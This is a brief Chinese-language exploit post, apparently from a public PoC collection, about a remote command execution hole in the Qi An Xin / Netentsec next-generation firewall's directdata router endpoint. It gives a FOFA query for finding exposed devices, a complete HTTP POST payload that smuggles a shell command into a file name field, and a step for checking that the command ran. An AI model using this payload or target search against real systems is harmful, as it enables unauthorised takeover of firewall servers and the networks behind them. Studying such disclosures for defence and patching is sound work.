## 奇安信网康下一代防火墙directdata存在远程命令执行漏洞

奇安信网康下一代防火墙（NGFW）是网康科技推出的一款可全面应对网络威胁的高性能应用层防火墙，存在远程命令执行，通过漏洞攻击者可以获取服务器权限。

## fofa
```
app="网康下一代防火墙"
```

## poc
```
POST /directdata/direct/router HTTP/1.1
Host: 
Connection: close
Content-Length: 160
Upgrade-Insecure-Requests: 1

{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;id >/var/www/html/test.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
```

![5655f30db3f659f378796e6839e606ca](https://github.com/wy876/POC/assets/139549762/68a44096-0939-4fd7-971f-b73cde261000)

然后访问https://xxxx.xxx/test.txt

发现，命令已经成功执行
![9e52fb8cbdc1cb4fcd479c2a56eb05c8](https://github.com/wy876/POC/assets/139549762/5227040a-13f1-4b7c-9d04-f22cbfd34404)

